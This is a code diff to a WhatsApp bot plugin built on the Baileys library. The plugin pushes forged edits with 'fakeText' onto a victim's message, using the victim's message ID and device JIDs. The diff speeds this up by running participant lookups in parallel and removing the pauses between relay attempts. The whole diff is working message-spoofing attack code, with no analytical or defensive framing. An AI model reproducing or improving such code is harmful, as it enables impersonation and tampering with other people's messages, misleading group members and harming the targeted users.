@@ -1,6 +1,19 @@
 import { generateWAMessageFromContent, proto, jidNormalizedUser } from '@whiskeysockets/baileys'
 
-const wait = (ms) => new Promise((resolve) => setTimeout(resolve, ms))
+const LID_LOOKUP_TIMEOUT = 250
+const resolveWithin = (promise, timeout) => new Promise((resolve) => {
+  const timer = setTimeout(() => resolve(null), timeout)
+  Promise.resolve(promise).then(
+    (value) => {
+      clearTimeout(timer)
+      resolve(value)
+    },
+    () => {
+      clearTimeout(timer)
+      resolve(null)
+    }
+  )
+})
 
 const safeCall = (fn) => {
   try {
@@ -129,22 +142,16 @@ const collectParticipants = async ({ conn, m, chat, isGroup, contextInfo }) => {
 
   const lidMap = conn.signalRepository?.lidMapping
   if (isGroup && lidMap) {
-    for (const jid of [...candidates]) {
+    const lookups = [...new Set(candidates)].map(async (jid) => {
       const normalized = normalizeJid(conn, jid)
       if (/@lid$/.test(normalized) && typeof lidMap.getPNForLID === 'function') {
-        const pn = await safeCall(() => Promise.race([
-          lidMap.getPNForLID(normalized),
-          wait(4000).then(() => null),
-        ]))
-        pushUnique(candidates, pn)
+        return safeCall(() => resolveWithin(lidMap.getPNForLID(normalized), LID_LOOKUP_TIMEOUT))
       } else if (/@s\.whatsapp\.net$/.test(normalized) && typeof lidMap.getLIDForPN === 'function') {
-        const lid = await safeCall(() => Promise.race([
-          lidMap.getLIDForPN(normalized),
-          wait(4000).then(() => null),
-        ]))
-        pushUnique(candidates, lid)
+        return safeCall(() => resolveWithin(lidMap.getLIDForPN(normalized), LID_LOOKUP_TIMEOUT))
       }
-    }
+      return null
+    })
+    for (const jid of await Promise.all(lookups)) pushUnique(candidates, jid)
   }
 
   const participants = []
@@ -243,7 +250,6 @@ const handler = async (m, { conn, text, usedPrefix, command }) => {
       } else {
         await attempt(`relay extended ${JSON.stringify(key)}`, () => relayEdit(conn, chat, key, { extendedTextMessage: { text: fakeText } }))
       }
-      await wait(80)
     }
 
     await attempt('relay conversation key primaria', () => relayEdit(conn, chat, targetKeys[0], { conversation: fakeText }))
@@ -256,16 +262,13 @@ const handler = async (m, { conn, text, usedPrefix, command }) => {
         await attempt(`relay directed ext ${deviceJid}`, () => relayEdit(conn, chat, key, { extendedTextMessage: { text: fakeText } }, {
           participant: { jid: deviceJid },
         }))
-        await wait(80)
         await attempt(`relay original-id ext ${participant}`, () => relayEdit(conn, chat, key, { extendedTextMessage: { text: fakeText } }, {
           messageId: victimMsgId,
         }))
-        await wait(80)
         await attempt(`relay directed original-id conversation ${deviceJid}`, () => relayEdit(conn, chat, key, { conversation: fakeText }, {
           messageId: victimMsgId,
           participant: { jid: deviceJid },
         }))
-        await wait(80)
       }
     }
 
